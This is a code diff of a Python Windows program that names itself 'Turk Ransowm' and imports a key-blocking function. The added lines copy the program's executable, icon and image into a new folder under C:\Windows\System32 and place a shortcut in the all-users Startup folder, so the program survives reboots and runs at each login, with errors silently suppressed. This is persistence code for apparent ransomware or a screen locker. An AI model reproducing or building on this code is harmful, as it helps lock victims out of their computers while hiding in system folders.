@@ -2,7 +2,7 @@ from customtkinter import *
 from PIL import Image
 from qrcode import QRCode,constants
 from keyboard import block_key
-from shutil import move
+from shutil import move,copy
 from os import path,makedirs
 import winshell
 from win32com.client import Dispatch
@@ -26,17 +26,27 @@ class Window(CTk):
         self.bg_image = CTkImage(self.background_image, size=(1920, 1080))
         self.bg_label = CTkLabel(self, image=self.bg_image, text="")
         target = os.path.join(os.getcwd(),"Turk Ransowm.exe")
+        # target = os.path.join(os.getcwd(),"Turk Ransowm.py")
+        target2 = os.path.join(os.getcwd(),"Turk.jpg")
         shortcut = "lol.lnk"
         icon = os.path.join(os.getcwd(),"MT.ico")
         source_file = "lol.lnk"
         destination_dir = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+        main_dir = r"C:\Windows\System32\Turk"
+        target_after = os.path.join(main_dir,"Turk Ransowm.exe")
+        # target_after = os.path.join(main_dir,"Turk Ransowm.py")
+        icon_after = os.path.join(main_dir,"MT.ico")
         makedirs(destination_dir, exist_ok=True)
         file_path = path.join(destination_dir, source_file)
         try:
             if path.isfile(file_path):
                 pass
             else:
-                self.create_shortcut(target, shortcut, icon)
+                makedirs(main_dir, exist_ok=True)
+                copy(target,target_after)
+                copy(icon,main_dir)
+                copy(target2,main_dir)
+                self.create_shortcut(target_after, shortcut, icon_after)
                 move(source_file, destination_dir)
         except Exception as e:
             pass
